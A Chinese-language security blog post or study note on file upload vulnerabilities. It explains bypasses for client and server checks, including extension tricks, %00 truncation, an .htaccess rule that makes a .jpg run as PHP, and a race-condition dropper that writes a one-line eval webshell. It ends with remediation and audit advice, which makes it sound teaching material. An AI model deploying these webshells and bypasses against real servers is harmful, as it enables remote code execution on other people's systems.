---
title: 文件上传漏洞
date: 2020-1-22 20:02:00
---
## 客户端校验

**检测**

Javascript校验后缀名（一般只校验后缀名）

**绕过**

开Burp代理，随便点击浏览“”选择文件，但是还没点击“上传”，就弹出警告框，说明流量没经过burp代理；所以非常可能是客户端JavaScript检测。

直接把木马改成`.gif`后缀上传，BurpSuite拦包修改后缀名

## 服务端校验

**校验**

1. MIME检测 文件头content-type字段校验（image/gif）

2. 文件内容头校验（GIF89a）

3. 文件扩展名校验  (白名单、黑名单)

4. 文件内容检测 (检测内容是否合法或含有恶意代码) 

**绕过**

前两种校验，在恶意脚本前添加GIF89a标识，一句话前后加图片数据混淆；直接把木马改成`.gif`后缀上传，BurpSuite拦包修改后缀名。

**黑名单绕过：**

找漏网之鱼：`cer、php3、php4`等

大小写绕过：`AsP、pHP`

文件后缀复写绕过：`.phphpp`

针对Windows系统：

上传不符合windows文件命名规则的文件名

```
test.php:1.jpg
test.php::$DATA
```

会被windows系统自动去掉不符合规则符号后面的内容

会被windows系统自动去掉不符合规则符号后面的内容

**白名单绕过：**

> %00截断 (PHP<5.3.4时 shell.php%00.jpg 可截断%00后的内容)
> 配合服务器中间件解析漏洞绕过

黑白名单通用，如果可上传修改 `.htaccess` 文件 (还能用于隐藏后门) 

```php
<FilesMatch "shell.jpg">
 SetHandler application/x-httpd-php
</FilesMatch>
//上传shell.jpg文件，将解析为php运行
```

**文件加载检测(文件内容检测)**

常见的是对图像进行二次渲染，一般是调用PHP 的GD库 

一个绕过GD库的Webshell生成器：

http://wiki.ioin.in/soft/detail/1q

https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE

## 竞争条件攻击

一些网站允许上传任意文件，然后检测文件是否包含Webshell，如果有则删除该文件。

> 服务器端在处理不同用户的请求时是并发进行的
>
> 如果并发处理不当或相关操作逻辑顺序设计的不合理时，将导致条件竞争漏洞

如这样一段代码

```php
<?php
	if(isset($_GET['src'])){
		copy($_GET['src'],$_GET['dst']);
      sleep(2);
		unlink($_GET['dst']);
	}
?>
```

它先把文件保存在本地，再检查，然后删除

在上传完成和安全检查删除它的间隙，攻击者用多线程不断的发起访问请求该文件

该文件就会被执行从而生成一个恶意shell

**竞争删除前生成shell流程：**

> 上传文件→访问执行文件，生成shell文件→删除不安全文件 	(多线程访问)

**create_shell.php**

```php
<?php
	fputs(fopen('../shell.php','w'),'<?php @eval($_POST[123]) ?>');
?>
```

**防御方案：**

对于文件上传，在将文件保存在本地前就进行相应的安全检查

## 修复建议

> 1、使用白名单限制可以上传的文件扩展名
>
> 2、注意0x00截断攻击（PHP更新到最新版本）
>
> 3、对上传后的文件统一随机命名，不允许用户控制扩展名
>
> 4、上传文件的存储目录禁用执行权限

**代码审计中关注以下函数**

```php
move_uploaded_file()	//将上传的文件移动到新位置
```

全局搜索`$_FILES`变量，定位到相关的上传过程查看过滤是否严格。